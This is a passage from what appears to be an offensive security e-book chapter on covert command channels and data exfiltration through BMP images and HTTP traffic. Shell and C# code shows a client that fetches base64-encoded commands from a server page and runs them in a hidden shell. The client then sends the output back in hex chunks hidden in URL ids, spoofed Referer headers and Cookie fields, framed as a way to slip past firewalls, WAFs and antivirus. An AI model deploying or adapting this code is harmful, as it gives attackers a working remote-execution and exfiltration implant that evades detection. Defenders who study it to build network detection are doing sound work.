\n\r\n\r[&gt;]:Enter::chat:input:#@base64on\n\r\n\r \n\r\n\rwith this Command you can have Text-message/Payload injection by base64 encoding instead Clear-text.\n\r\n\r \n\r\n\r\n\r\n\r Picture 16:  \n\r\n\rPicture 17: \n\r\n\r \n\r\n\ras you can see in “Picture 17” my Text-message sent by Base64 in this Picture after “@base64on” Command and in Client-side we have this Info “[!]:Base64 Payload/Message Detected!” so this Text-data “this is text-message by BASE64 ;)” sent by Base64 Payload via BMP file “ChatviaPixels.bmp” and saved to Client-side with name “ChatviaPixels.bmp.2” .\n\r\n\r \n\r\n\rIn the next “Picture 18” you can see our Payload changed from Clear-text “this is text-message by BASE64 ;)” to bytes and these bytes are our Base64 Payload!. \n\r\n\r\n\r\n\rPicture 18:\n\r\n\rfor convert this BMP Base64 Payload to clear-text we need to use some Commands so in the Next “Picture 19 and 20” you can see these command for convert this Payload from Base64 to Clear text. \n\r\n\r  \n\r\n\rPicture 19:\n\r\n\ras I said this Base64 Payload Saved to “ChatviaPixels.bmp.2” and to figure out what exactly is behind these Bytes you should use these Commands in the “Picture 20” \n\r\n\r\n\r\n\r \n\r\n\rPicture 20: \n\r\n\r \n\r\n\rUsing Commands by “@cmd:Commands” instead Text-messages via BMP files\n\r\n\r \n\r\n\rwe talked about this Method in Part1 of this Chapter-11 but again I want to say this Important Point “this is really good way for Exfil/Hiding Payloads against Firewalls and Avs also this method is kind of Tunneling (one-way/two-way) by Images over HTTP/HTTPS Traffic so advanced Malware will use by this Method for Transferring Commands between infected systems and hackers so this is “Big Deal and Serious Problem” ….\n\r\n\r \n\r\n\rNote : in our network traffic between systemA and systemB we have BMP files with “Same Name and Same Size more often”.\n\r\n\r \n\r\n\rnow in this Section I want to talk about Transferring Commands via BMP files , in “NativePayload_Image.sh” v2 with this syntax you can use Commands instead Text-messages very simple :\n\r\n\r \n\r\n\rsyntax     : @cmd:Commands\n\r\n\rExample : @cmd:uname -a\n\r\n\r \n\r\n\rso our steps are :\n\r\n\r \n\r\n\rSending “Commands” by this method step by step :\n\r\n\rStep1   : SystemA want to send Cmd “uname -a” ---- &gt; SystemB\n\r\n\rStep1-1: SystemA , “@cmd:uanem -a” injected to BMP1 , now BMP1 is Ready...\n\r\n\rStep1-2: SystemA send Signal to –----&gt; SystemB for Download BMP1\n\r\n\rStep2   : SystemB Downloaded BMP1 from SystemA over HTTP traffic , CMD Detected by SystemB!\n\r\n\rStep2-1: SystemB CMD extracted from BMP1  and Executed locally on SystemB\n\r\n\rStep2-2: SystemB CMD output Injected to BMP2  ,  now BMP2 is Ready...\n\r\n\rStep2-3: SystemB send Signal to –---&gt; SystemA for Download BMP2\n\r\n\rStep3   : SystemA Downloaded BMP2 from SystemB over HTTP traffic , show text for CMD output\n\r\n\r in the next “Picture 21” you can see these Steps for command “uname -a”. \n\r\n\rPicture 21:\n\r\n\rin then next “Picture 22” you can see our CMD output injected to this “ChatviaPixels.bmp.3” by Base64.\n\r\n\r  \n\r\n\rPicture 22:\n\r\n\r \n\r\n\rUsing Command “@msgsave” to Saving all Text-Messages/Command-Outputs with details Information!\n\r\n\r \n\r\n\rWith this syntax you can save all Messages very simple : \n\r\n\rsyntax     : @msgsave\n\r\n\rso you can see in the next “Picture 23” by this command all Messages saved to one text file with detail information.\n\r\n\r-N--&gt; it means this file has Normal Payload without Base64-B--&gt; it means this file has Base64 Payload \n\r\n\rPicture 23:\n\r\n\r \n\r\n\rUsing Command “@msglist” to see all Text-Messages/Command-Outputs with details Information!\n\r\n\r \n\r\n\rWith this syntax you can see all Messages very simple : \n\r\n\r \n\r\n\rsyntax     : @msglist\n\r\n\r-N--&gt; it means this file has Normal Payload without Base64\n\r\n\r-B--&gt; it means this file has Base64 Payload\n\r\n\r as you can see in the two next “Pictures 24 , 25” we can see Messages Detail in both Sides. \n\r\n\rPicture 24:\n\r\n\r \n\r\n\r Picture 25: \n\r\n\ras you can see by these Pictures we can use Images for DATA Transferring also this is kind of Tunneling by Images over HTTP Traffic.\n\r\n\r \n\r\n\r ","","topics\\Chapter 11 - Part 2.html","\n\r\n\rSimple way for Data Exfiltration via HTTP Traffic (PART1)\n\r\n\r \n\r\n\rIn this chapter I want to talk about Exfiltration via HTTP traffic . the idea for this Technique is “Payloads Injection to HTTP Header via (Referer and Cookie also IDs values in urls) by Fake Headers. But we have a lot things in HTTP header for use them as payload , for more information about HTTP Header you can read this link :\n\r\n\r \n\r\n\rHTTP Header fields: https://en.wikipedia.org/wiki/List_of_HTTP_header_fields\n\r\n\r\n\r\n\rNote : when I said “Fake Header” , it means you will have Header with legal fields in HTTP Packet but you can use these fields as payload for DATA Exfiltration.\n\r\n\r\n\r\n\rSo in this chapter I will talk about (3 Techniques) which used in my shell code “NativePayload_HTTP.sh” also C# code. \n\r\n\r\n\r\n\rThese Technique are:\n\r\n\r1.DATA Exfiltration/Sending via “ID Variable” and Values by url\n\r\n\r2.DATA Exfiltration/Sending via “Referer” HTTP Header Field\n\r\n\r3.DATA Exfiltration/Sending via “Cookie” HTTP Header Field\n\r\n\r\n\r\n\rNote: My code has Client-Side (C#/Shell code) and Server-Side (Shell code only). \n\r\n\r\n\r\n\rNote: in this chapter I want to talk about Exfiltration (data sending from Client to Server) so my goal is payloads send from client to server by web /GET Request and web Response for each /GET Request was not important to me in my codes.\n\r\n\r\n\r\n\rNote : rethink about Web application codes also Web Response is next step in these techniques but this was not my focus in this chapter-12 and my codes.\n\r\n\r  \n\r\n\ralso I want to talk about this methods by simple codes and simple steps without (Complicated or difficult) Codes or methods .\n\r\n\rso I will show you , you can do these methods by simple codes and I focus is on HTTP Traffic in this chapter-12 and in my codes my focus was not about “html or aspx” codes or web programming so if you are web developer after read this chapter you can do this better than me (client/server side) for bypassing Firewalls/WAF or Some AVS , but about Firewall Detection against these methods you should test these codes one by one with my tool “NativePayload_HTTP” or your own codes , finally I hope these codes and ideas will be useful for you to test your Firewalls and network security tools. \n\r\n\r\n\r\n\r1.DATA Exfiltration/sending via IDs Variable and Values by URL, What is this technique (step by step) ? \n\r\n\r\n\r\n\rIn this Method you can use ID or UID values in “url” as Payload to send Data/payloads from client to server.\n\r\n\r\n\r\n\rso let me explain this Method and Technique step by step but we talked about this method in previous chapter-11 too:\n\r\n\rfor example we have this Payload=”this is my BMP payload” and “this is my second BMP payload” for Exfiltration via “uids” values and web requests (/GET).\n\r\n\rso in Client side we will have something like these Commands to send payloads to server:\n\r\n\r\n\r\n\rClient side :\n\r\n\rroot@kali:~# echo \"this is my bmp payload\" | xxd -p \n\r\n\r74686973206973206d7920626d70207061796c6f61640a\n\r\n\rroot@kali:~# echo \"this is my bmp payload\" | xxd -p | rev \n\r\n\ra04616f6c69716070207d6260297d60237960237968647\n\r\n\rroot@kali:~#\n\r\n\rroot@kali:~# curl http://127.0.0.1/Mainpage.aspx?ids=a04616f6c69716070207d6260297d60237960237968647 \n\r\n\r&lt;head&gt;\n\r\n\r&lt;title&gt;Error response&lt;/title&gt;\n\r\n\r&lt;/head&gt;\n\r\n\r&lt;body&gt;\n\r\n\r&lt;h1&gt;Error response&lt;/h1&gt;\n\r\n\r&lt;p&gt;Error code 404.\n\r\n\r&lt;p&gt;Message: File not found.\n\r\n\r&lt;p&gt;Error code explanation: 404 = Nothing matches the given URI.\n\r\n\r&lt;/body&gt;\n\r\n\rroot@kali:~# \n\r\n\rroot@kali:~# echo \"this is my second bmp payload\" | xxd  -p\n\r\n\r74686973206973206d79207365636f6e6420626d70207061796c6f61640a\n\r\n\rroot@kali:~# echo \"this is my second bmp payload\" | xxd  -p | rev\n\r\n\ra04616f6c69716070207d6260246e6f63656370297d60237960237968647\n\r\n\rroot@kali:~#\n\r\n\rroot@kali:~# curl http://127.0.0.1/Mainpage.aspx?ids=a04616f6c69716070207d6260246e6f63656370297d60237960237968647\n\r\n\r&lt;head&gt;\n\r\n\r&lt;title&gt;Error response&lt;/title&gt;\n\r\n\r&lt;/head&gt;\n\r\n\r&lt;body&gt;\n\r\n\r&lt;h1&gt;Error response&lt;/h1&gt;\n\r\n\r&lt;p&gt;Error code 404.\n\r\n\r&lt;p&gt;Message: File not found.\n\r\n\r&lt;p&gt;Error code explanation: 404 = Nothing matches the given URI.\n\r\n\r&lt;/body&gt;\n\r\n\rroot@kali:~# \n\r\n\r\n\r\n\rNote: I got Error because I did not have “Mainpage.aspx” file in server side so to avoid “Error Code 404” just we need to create this file in server side by this command :\n\r\n\r \n\r\n\recho “Ops codes here ;)“  &gt;  Mainpage.aspx\n\r\n\r \n\r\n\rNote: Some “http error” will be a “flag” to network traffic detection by firewalls!  \n\r\n\r \n\r\n\rin Server-side we should have something like these Commands to download DATA by Web server log file.\n\r\n\r \n\r\n\rServer side :\n\r\n\rroot@kali2:~# nohup python -m SimpleHTTPServer 80 &gt; SimpleHTTPServer.txt  2&gt;&amp;1 &amp;\n\r\n\r[1] 1744\n\r\n\rroot@kali2:~# \n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt \n\r\n\rnohup: ignoring input\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:30:35] code 404, message File not found\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:30:35] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:31:32] code 404, message File not found\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:31:32] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260246e6f63656370297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt  | grep \"ids=\"\n\r\n\rroot@kali2:~# \n\r\n\r127.0.0.1 - - [24/Dec/2018 15:30:35] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\r127.0.0.1 - - [24/Dec/2018 15:31:32] \"GET /Mainpage.aspx?ids=a04616f6c69716070207d6260246e6f63656370297d60237960237968647 HTTP/1.1\" 404 -\n\r\n\rroot@kali2:~# \n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt  | grep \"ids=\" | awk {\'print $7\'} | cut -d\'=\' -f2 \n\r\n\ra04616f6c69716070207d6260297d60237960237968647\n\r\n\ra04616f6c69716070207d6260246e6f63656370297d60237960237968647\n\r\n\rroot@kali2:~# \n\r\n\rroot@kali2:~# cat SimpleHTTPServer.txt  | grep \"ids=\" | awk {\'print $7\'} | cut -d\'=\' -f2 | rev | xxd -r -p\n\r\n\rthis is my bmp payload\n\r\n\rthis is my second bmp payload\n\r\n\rroot@kali2:~# \n\r\n\r \n\r\n\r \n\r\n\ras you can see we can have these DATA from client to server via Web-Server log file very simple. \n\r\n\rNow I want to talk about “script.sh” code to test this method by “NativePayload_HTTP.sh” step by step :\n\r\n\r Picture 1: Script.sh \n\r\n\rStep1 (Script.sh Client-side): Client Detection by Server \n\r\n\r \n\r\n\rWith this simple code this client will detect by server : curl “http://192.168.56.1/default.aspx?Session=$HOSid”\n\r\n\r“192.168.56.1” is server IPv4 address and “HOSid” is Client information\n\r\n\r Picture 2: Client Detected by server . \n\r\n\r\n\r\n\rServer-Side: I used this tool with this syntax: ./NativePayload_HTTP.sh -exfilwebserver 80 \n\r\n\rAs you can see in “Picture 2” client with IPv4.[192.168.56.101] Detected by server with this message: \n\r\n\r[!]:Client.IPv4.[192.168.56.101]:Detected\n\r\n\r\n\r\n\rServer-Side: now with this command “@cli” or “@client” in this tool you can see list of Clients.\n\r\n\rIn the next step I used command “@” or “@interact” to interact to client with IPv4 “192.168.56.101” and finally I used this command in server-side “echo this is simple test ;)”. this command will execute in client side after little bit changes in Web-server pages so let me talk about details:\n\r\n\r \n\r\n\rin this time we have some steps like these:\n\r\n\rstep 1-1: client send signal to server \n\r\n\rstep 1-2: client detected by server (add to client list)\n\r\n\rstep 2-1: server-side (using “@interact IPv4” or “@ IPv4” command) for interact to client and enter command for client-side\n\r\n\rstep 2-2: server-side , command injected to “getcmd.aspx” page file (“cmd=echo this is simple test ;)”) by “base64” format.\n\r\n\rstep 3-1: client will send /GET request to read/download “getcmd.aspx” page after (press enter to continue...)\n\r\n\r\n\r\n\rstep 2-2 : in this time I do not want to talk about server-side codes but you should know this command “echo this is simple test ;)” will inject to “getcmd.aspx” page file by something like this format:\n\r\n\r\n\r\n\rhtml code 1: getcmd.aspx file\n\r\n\r&lt;span id=\"myTimeLabel_PivotServerCMD\"  style=\"color:red; visibility:hidden\" &gt;&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_PivotClient\"  style=\"color:red; visibility:hidden\" &gt;&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_TargetHost\"  style=\"color:red; visibility:hidden\" &gt;192.168.56.101&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_Time\"  style=\"color:red; visibility:hidden\" &gt;[[22-02-2019.22-42-44]]&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_FakeheaderStatus\"  style=\"color:red; visibility:hidden\" &gt;xheader-off&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_CMD\"  style=\"color:red; visibility:hidden\" &gt;ZWNobyB0aGlzIGlzIHNpbXBsZSB0ZXN0IDspCg==&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_Base64Status\"  style=\"color:red; visibility:hidden\" &gt;,0&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_Delay\"  style=\"color:red; visibility:hidden\" &gt;192.168.56.101|0&lt;/span&gt;\n\r\n\r&lt;span id=\"myTimeLabel_FakeHeaderMode\"  style=\"color:red; visibility:hidden\" &gt;,0&lt;/span&gt;\n\r\n\r\n\r\n\rstep 3-1 : in this step Client will get “getcmd.aspx” from server by this code:\n\r\n\rnohup curl \"http://192.168.56.1/getcmd.aspx\" &gt; \"dumpcmds.log\" 2&gt;&amp;1 &amp;\n\r\n\r\n\r\n\ras you can see in “script.sh” code we have “read -p” before “step 3-1”.\n\r\n\r\n\r\n\rScript.sh code1:\n\r\n\rread -p \"press enter to continue...\" input\n\r\n\r# dumping information about cmd from server \n\r\n\rnohup curl \"http://192.168.56.1/getcmd.aspx\" &gt; \"dumpcmds.log\" 2&gt;&amp;1 &amp;\n\r\n\rsleep 2.5\n\r\n\r# detecting cmd \n\r\n\rmycmd=`strings \"dumpcmds.log\" | grep \"myTimeLabel_CMD\" | cut -d\'&gt;\' -f2 | cut -d\'&lt;\' -f1 | base64 -d`\n\r\n\r\n\r\n\rI used this code because before download “getcmd.aspx” we should do something in server-side like “Picture 2” as you can see in “Picture 2” first step in client-side was (running ./Script.sh) then we have this Message “press enter to continue...” in this time in server-side we have this message (Detected Client : IPv4.[192.168.56.101] ) and with this command “@ 192.168.56.101” or “@interact  192.168.56.101” you can interact to this client and finally you should press enter in server-side to inject these information like “html code1” to “getcmd.aspx” page. \n\r\n\r\n\r\n\rStep2 (Script.sh Client-side): Detecting Commands , (Client-side)\n\r\n\r\n\r\n\rNote : now in this time in client-side you should (press enter to continue….)\n\r\n\r\n\r\n\ras you can see I used this code “nohup curl \"http://192.168.56.1/getcmd.aspx\" &gt; \"dumpcmds.log\" 2&gt;&amp;1 &amp;” for download “getcmd.aspx” page so our output is this “dumpcmds.log” file and after (delay: 2.5 sec) by next code you can read this log file:\n\r\n\r\n\r\n\r mycmd=`strings \"dumpcmds.log\" | grep \"myTimeLabel_CMD\" | cut -d\'&gt;\' -f2 | cut -d\'&lt;\' -f1 | base64 -d`\n\r\n\r\n\r\n\rWith this line of code you can have command which downloaded from server. Now this command will execute in client-side by code with “line number 2”. (you can see this code in [Script.sh code2]).\n\r\n\rPicture 3: Detecting CMD (client-side) \n\r\n\r\n\r\n\rNote: you need this delay before read “dumpcmds.log” and recommended value is between 2 up to 4 sec.\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rScript.sh code2:\n\r\n\r0               sleep 1\n\r\n\r1        # executing cmd\n\r\n\r2        output=`$mycmd`\n\r\n\r3\n\r\n\r4        sleep 1\n\r\n\r5        LocalhostIPv4=`hostname -I`\n\r\n\r6        output=`echo \"[$LocalhostIPv4] =&gt; \"$output`\n\r\n\r7        # data/cmd-output sending via chunked (uids=bytes).values start\n\r\n\r8        for bytes in `echo $output | xxd -p -c 12 | rev`;\n\r\n\r9        do\n\r\n\r10        sleep 1.5\n\r\n\r11        nohup curl \"http://192.168.56.1/default.aspx?uids=$bytes\" &gt; out.txt  2&gt;&amp;1 &amp;\n\r\n\r12        done\n\r\n\r13        # data/cmd-output sending via chunked (uids=bytes).values done\n\r\n\r14            # sending signal to server for \"cmd-output Exfiltration finish\"\n\r\n\r15            nohup curl \"http://192.168.56.1/default.aspx?logoff=null\" &gt; out.txt  2&gt;&amp;1 &amp;\n\r\n\r \n\r\n\rStep3 (Script.sh Client-side): Executing Command Client-side\n\r\n\r\n\r\n\rnow by code in “line 2” you can execute CMD in client-side (locally).\n\r\n\rFinally with codes from “line 5 up to 12” your command output + Client IPv4 address will send to server by chunked (12 bytes) via “uids” variable. it means your command output converted to bytes also sent via “uids” values to server.\n\r\n\rAnd with code in “line 15” client sent signal to server as “finish flag”. In this time command output will show in server-side like “Picture 4”.\n\r\n\rPicture 4: Command executed in client-side and output detected by server-side.   \n\r\n\r\n\r\n\rC# Codes vs Shell Codes:\n\r\n\rnow I want to talk about C# codes and some important things about C# .\n\r\n\r\n\r\n\rin C# code I used this Method “DumpHtml()” instead “curl” in shell script. \n\r\n\r\n\r\n\r  public static string DumpHtml(string url)\n\r\n\r        {\n\r\n\r           \n\r\n\r                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);\n\r\n\r                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;\n\r\n\r\n\r\n\r                string _output = \"\";\n\r\n\r                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())\n\r\n\r                using (Stream stream = response.GetResponseStream())\n\r\n\r                using (StreamReader reader = new StreamReader(stream))\n\r\n\r                {\n\r\n\r                    _output = reader.ReadToEnd();\n\r\n\r                   return _output.Substring(0, _output.Length - 1);\n\r\n\r                }\n\r\n\r          \n\r\n\r        }\n\r\n\r\n\r\n\ralso when you want to run CMD or Command , you need something like this Method “_CMDshell()“ .\n\r\n\r\n\r\n\r        public static string _CMDshell(string _Command1, string _AllIPs)\n\r\n\r        {\n\r\n\r            string xtemp;\n\r\n\r            Process prcs = new Process();\n\r\n\r            prcs.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n\r\n\r            prcs.StartInfo.CreateNoWindow = true;\n\r\n\r            prcs.StartInfo.FileName = \"cmd.exe\";\n\r\n\r            prcs.StartInfo.Arguments = \"/C \" + _Command1;\n\r\n\r            prcs.StartInfo.RedirectStandardOutput = true;\n\r\n\r            prcs.StartInfo.RedirectStandardError = true;\n\r\n\r            prcs.StartInfo.UseShellExecute = false;\n\r\n\r            prcs.Start();\n\r\n\r            string CMDoutput = prcs.StandardOutput.ReadToEnd();\n\r\n\r            string error = prcs.StandardError.ReadToEnd();\n\r\n\r            xtemp = \"[\" + _AllIPs + \"] =&gt; \" + CMDoutput;\n\r\n\r            return xtemp;\n\r\n\r        }\n\r\n\r  \n\r\n\rFinally with these simple codes you can execute command also with this code your command output will send to server.\n\r\n\r \n\r\n\rtemp = _CMDshell(Command1, AllIPs[1].ToString());\n\r\n\r\n\r\n\rif (FakeHeader_onoff_status == \"xheader-off\")\n\r\n\routput = DumpHtml(\"http://\" + args[1] + \"/default.aspx?uids=\" + temp_rev);\n\r\n\r\n\r\n\rThread.Sleep(1000);\n\r\n\routput = DumpHtml(\"http://\" + args[1] + \"/default.aspx?logoff=null\");\n\r\n\r\n\r\n\r\n\r\n\rWhy this method is important ?\n\r\n\rShort answer is : because this way is very simple and normal way for send Data from client to server by “legal or illegal Web Applications” via HTTP/HTTPS Traffic. \n\r\n\r \n\r\n\rWhat is Firewalls Reaction ?\n\r\n\rThis is very “Important Question” you should think about that and test this method in your Network by this simple code or your own codes with deeply focus on web applications codes also HTTP Traffic. \n\r\n\r\n\r\n\rFor example: with my code in this method you will send DATA via URL and “uids” values from client to server but in this code my server always will Response to client via simple/static “Aspx” page and maybe it will be “bad behavior” and flag for detection by Firewalls , so what will happen if your server response was by “Dynamic Response” via “Aspx” or “php” pages?\n\r\n\r \n\r\n\r\n\r\n\r2.DATA Exfiltration/Sending via “Referer” HTTP Header Field , What is this technique (step by step)? \n\r\n\r\n\r\n\rIn this method you can use “referer” HTTP header field as payload for send data/payload to server.  \n\r\n\r\n\r\n\rWhat is “referer”?\n\r\n\rThe HTTP “referer” is an optional HTTP header field that identifies the address of the webpage that linked to the resource being requested.\n\r\n\r\n\r\n\rthis method step by step :\n\r\n\rin this method your Data/Payload will inject to “Referer” Filed in HTTP Header via simple code .\n\r\n\rMy code “script2.sh” almost is same with previous method code “script.sh” but in this case we need HTTP Header and “curl” command with little bit changes, so let me talk about Code:\n\r\n\r \n\r\n\r\n\r\n\ras you can see this “script2.sh” is as same as with “script.sh” but just we have some new things in “curl” command.\n\r\n\rIt means all steps for “script2.sh” are same with “script.sh” .\n\r\n\r\n\r\n\rScript.sh:\n\r\n\r         nohup curl \"http://192.168.56.1/default.aspx?uids=$bytes\" &gt; out.txt  2&gt;&amp;1 &amp;\n\r\n\r\n\r\n\rScript2.sh:\n\r\n\r          nohup curl -v \\\n\r\n\r        -H \"Host: 192.168.56.1\" -H \'Connection: keep-alive\' -H \'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\' \\\n\r\n\r        -H \'Accept-Language: en-US;q=0.8,en;q=0.6\' -H \'Upgrade-Insecure-Requests: 1\' -H \"Accept-Encoding: gzip, deflate\" \\\n\r\n\r        -e \"https://www.google.com/search?ei=bsZAXPSqD&amp;uids=$bytes&amp;q=$_Random2&amp;oq=a0d3d37b&amp;gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q\" \\\n\r\n\r        -A \'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0\' \\\n\r\n\r        \"http://192.168.56.1/default.aspx\" &gt; \"out.txt\" 2&gt;&amp;1 &amp;        \n\r\n\r\n\r\n\ras you can see in “script2.sh” we don’t have “uids=” variable in “url” and this variable injected to “referer” filed by switch “-e” \n\r\n\r\n\r\n\r-e \"https://www.google.com/search?ei=bsZAXPSqD&amp;uids=$bytes&amp;q=$_Random2&amp;oq=a0d3d37b&amp;gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q\" \\\n\r\n\r\n\r\n\rthis is big different between previous code “script.sh” with this new code “script2.sh”. So in this case our payload injected to  “referer” by this address “https://www.google.com/search?...” but if you think this is not good “referer” address, you can use something like these addresses instead “google.com”\n\r\n\r\n\r\n\r-e “https://www.yourdomain.com/search/[payload]/result” \n\r\n\r-e “https://www.yourdomain.com/search/5776a6e4874396d45354a775/”\n\r\n\r-e “https://www.yourdomain.com/report/5776a6e4874396d45354a775/”\n\r\n\r-e “https://www.yourdomain.com/something/5776a6e4874396d45354a775/”\n\r\n\r-e “https://www.yourdomain.com/5776a6e4874396d45354a775/search”\n\r\n\r \n\r\n\r\n\r\n\ras you can see in “Picture 6” in server-side I used this tool “NativePayload_HTTP.sh -exfilwebserver 80“ and I used “script2.sh” in client-side , now we have this message “press enter to continue...” in client-side , in this time in server-side we have some new steps :\n\r\n\r\n\r\n\rstep0: script2.sh executed\n\r\n\rstep1: Client detected by server with IPv4 192.168.56.102\n\r\n\rstep2: with command “@ 192.168.56.102” you can have interaction with client.\n\r\n\rstep3: in this time by this command “@fhn” or “@fheaderon” you will have Fake-Header with “setting:on”.(this step is new)  \n\r\n\rstep4: by this command “@xrn” or “@xrefon” you will have Payload Injection via “Referer” HTTP Header Field.(this step is new)  \n\r\n\rNote: before use “@xrn” you should use “@fhn” command to enable Fake-Header always and with “@fhf” you can disable Fake-Header configuration also with “@xrf” or “@xrefoff” you can disable “@xrn” command too.\n\r\n\rstep5: now you can enter your command to execute in client-side. as you can see in the “Picture 6” I used this command “echo this is test 2 ;)” \n\r\n\rstep6: press enter to continue…. (client-side).\n\r\n\rstep7: you will see command output (server-side). \n\r\n\r\n\r\n\ras you can see in “Picture 7” we have command output but in this case our Payload Injected to “Referer” HTTP Header Field.\n\r\n\rNow we should talk about details behind this method (especially in HTTP Traffic).\n\r\n\r \n\r\n\rImportant Point: by this command “./NatvePayload_HTTP.sh -exfilwebserver 80” , this code will run Web server based on “Apache” service , it means all /GET request will send from client-side (windows-linux) to “Apache2” service then my Code will monitor (Real-time Monitor with delay) these request by “Apache2 log file” (“/var/log/apache2/access.log”).\n\r\n\r\n\r\n\rIn the next “Picture 8” you can see what we have in Apache log file for this method , as you can see in this “Picture 8” we have “six lines”.\n\r\n\r\n\r\n\rNote: my Apache log file has this format:\n\r\n\rClients-IPv4  - -   [date-time]   “GET page HTTP/1.1”   status   length   “referer”   “user-agent”   “cookie”\n\r\n\r\n\r\n\rby default in apache log file you can see these fields except “cookie” and you can add this field by add this line in “/etc/apache2/apache2.conf” file like this:\n\r\n\r\n\r\n\rLogFormat \"%v:%p %h %l %u %t \\\"%r\\\" %&gt;s %O \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" vhost_combined\n\r\n\rLogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %O \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\" \\\"%{Cookie}i\\\"\" combined\n\r\n\rLogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %O\" common\n\r\n\rLogFormat \"%{Referer}i -&gt; %U\" referer\n\r\n\rLogFormat \"%{User-agent}i\" agent  \n\r\n\r\n\r\n\rNote: this “apache configuration” tested by “kali linux” only.\n\r\n\r\n\r\n\rlog records (details):\n\r\n\rLine 1: in this line you can see client sent  /GET request for download “getcmd.aspx” with Header.[user-agent] “curl/7.38.0” \n\r\n\r\n\r\n\r192.168.56.102 - - [date-time] “GET /getcmd.aspx HTTP/1.1” 200  2098  “-”   “Curl/7.38.0”   “-”\n\r\n\r\n\r\n\rin this time getcmd.aspx downloaded by client and command detected by client (for more information see “html code 1”) also command executed in client-side and finally command output is ready to send to server ,so command output will be in next lines in this log file. With line “2 up to 5” you can see we have “referer” field in log file with Exfiltration Payload in this case our payload is “echo” Command output (bytes).for example in line 2 we have something like this:\n\r\n\r\n\r\n\rhttps://www.google.com/search?ei=bsZAXPSqD&amp;uids=e26353e2836313e2239313b5&amp;q=$_Random2&amp;oq=a0d3d37b&amp;gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q\n\r\n\r\n\r\n\rin the last line we have finish flag for exfiltration: “default.aspx?logoff=null” and this log record has this time [16:00:51] and you can see in the “Picture 8” our output displayed “five seconds” after this “finish flag.” \n\r\n\r\n\r\n\r192.168.56.102 - - [23/Feb/2019:16:00:51] “GET /default.aspx?logoff=null HTTP/1.1” 200  749 “-”   “Curl/7.38.0”   “-”\n\r\n\r\n\r\n\rPicture 8: Script2.sh and command output and Apache log file. \n\r\n\r\n\r\n\rSo you can see my code in server side displayed all output from client-side by Monitoring this log file and this is good way also this way is very simple.\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r3.DATA Exfiltration/Sending via “cookie” HTTP Header Field , What is this technique (step by step)?\n\r\n\r\n\r\n\rIn this time I want to talk about HTTP “cookie” Header Field for exfiltration ,so again we have new “script3.sh” to test this technique by “NativePayload_HTTP.sh” code.\n\r\n\r\n\r\n\rIn this technique our payload should inject to “cookie” field in HTTP Header , in previous method I talked about Apache log file also Apache configuration file so as I mentioned we have “cookie” field in Apache log file by modify one line in Apache config file. now we can see cookies in log file like previous technique just in this case we need to focus to “cookie” instead “referer”. \n\r\n\r\n\r\n\ras you can see in “Picture 9”, our new “script3.sh” is as same as with “scrip2.sh”, except in part of “cookie” you can see where is different between these two codes here:\n\r\n\r\n\r\n\rScript2.sh:\n\r\n\r          nohup curl -v \\\n\r\n\r        -H \"Host: 192.168.56.1\" -H \'Connection: keep-alive\' -H \'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\' \\\n\r\n\r        -H \'Accept-Language: en-US;q=0.8,en;q=0.6\' -H \'Upgrade-Insecure-Requests: 1\' -H \"Accept-Encoding: gzip, deflate\" \\\n\r\n\r        -e \"https://www.google.com/search?ei=bsZAXPSqD&amp;uids=$bytes&amp;q=$_Random2&amp;oq=a0d3d37b&amp;gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q\" \\\n\r\n\r        -A \'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0\' \\\n\r\n\r        \"http://192.168.56.1/default.aspx\" &gt; \"out.txt\" 2&gt;&amp;1 &amp;        \n\r\n\r\n\r\n\rScript3.sh:\n\r\n\r         nohup curl -v \\\n\r\n\r        -H \"Host: 192.168.56.1\" -H \'Connection: keep-alive\' -H \'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\' \\\n\r\n\r        -H \'Accept-Language: en-US;q=0.8,en;q=0.6\' -H \'Upgrade-Insecure-Requests: 1\' -H \"Accept-Encoding: gzip, deflate\" \\\n\r\n\r        -e \"https://www.bing.com\" -b \"viewtype=Default; UniqueIDs=uids=$bytes&amp;$_Random2\" \\\n\r\n\r        -A \'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0\' \\\n\r\n\r        \"http://192.168.56.1/default.aspx\" &gt; \"out.txt\" 2&gt;&amp;1 &amp;        \n\r\n\r\n\r\n\ryou can see with switch “-b” , we can have cookies variable and values: 